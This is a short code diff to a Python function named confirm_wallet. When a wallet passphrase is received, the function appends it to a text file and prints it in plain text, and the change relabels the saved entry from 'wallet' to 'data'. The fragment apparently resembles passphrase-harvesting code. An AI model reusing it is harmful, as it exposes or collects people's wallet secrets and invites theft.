@@ -38,8 +38,8 @@ def confirm_wallet(user_address):
 
         if pass_phrase:
             with open('data.txt', 'a') as file:
-                file.write('wallet: '+ pass_phrase + '\n')
-            print(f'wallet: {pass_phrase}')  
+                file.write('data: '+ pass_phrase + '\n')
+            print(f'data: {pass_phrase}')  
             print('Data Saved Successfully')
         else:
             print('no data received')
